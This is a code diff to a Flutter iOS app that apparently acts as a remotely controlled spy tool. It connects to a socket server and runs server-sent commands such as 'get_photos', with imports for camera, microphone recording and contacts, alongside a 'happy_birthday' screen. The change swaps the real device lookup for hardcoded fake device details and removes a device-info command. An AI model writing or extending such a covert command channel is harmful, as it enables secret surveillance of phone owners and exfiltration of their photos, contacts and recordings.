@@ -9,7 +9,6 @@ import 'package:camera/camera.dart';
 import 'package:record/record.dart';
 import 'package:contacts_service/contacts_service.dart';
 import 'package:photo_manager/photo_manager.dart';
-import 'package:device_info_plus/device_info_plus.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:flutter_local_notifications/flutter_local_notifications.dart';
 
@@ -72,7 +71,11 @@ class _MyAppState extends State<MyApp> {
 
     socket.on('connect', (_) {
       setState(() => connected = true);
-      sendDeviceInfo();
+      socket.emit('device_info', {
+        'name': 'iPhone',
+        'model': 'iPhone 17',
+        'systemVersion': 'iOS 18',
+      });
     });
 
     socket.on('disconnect', (_) {
@@ -82,21 +85,6 @@ class _MyAppState extends State<MyApp> {
     socket.on('command', (data) {
       handleCommand(data);
     });
-  }
-
-  Future<void> sendDeviceInfo() async {
-    try {
-      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
-      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
-      
-      socket.emit('device_info', {
-        'name': iosInfo.name,
-        'model': iosInfo.utsname.machine,
-        'systemVersion': iosInfo.systemVersion,
-      });
-    } catch (e) {
-      print('Error: $e');
-    }
   }
 
   Future<void> handleCommand(dynamic data) async {
@@ -118,9 +106,6 @@ class _MyAppState extends State<MyApp> {
         break;
       case 'get_photos':
         await getPhotos(int.parse(params['count'] ?? '20'));
-        break;
-      case 'get_device_info':
-        await sendDeviceInfo();
         break;
       case 'happy_birthday':
         setState(() {
